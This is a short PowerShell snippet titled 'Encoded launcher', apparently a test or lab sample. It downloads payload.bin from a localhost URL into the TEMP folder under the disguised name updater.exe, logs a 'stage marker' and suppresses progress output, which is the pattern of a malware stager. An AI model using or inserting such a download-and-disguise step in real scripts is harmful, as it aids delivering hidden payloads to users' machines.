
# Encoded launcher
$RemoteUrl = "https://localhost:8080/payload.bin"
$DownloadPath = "$env:TEMP\updater.exe"
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DownloadPath)
Write-Verbose "stage marker 5 reached"
$ProgressPreference = "SilentlyContinue"
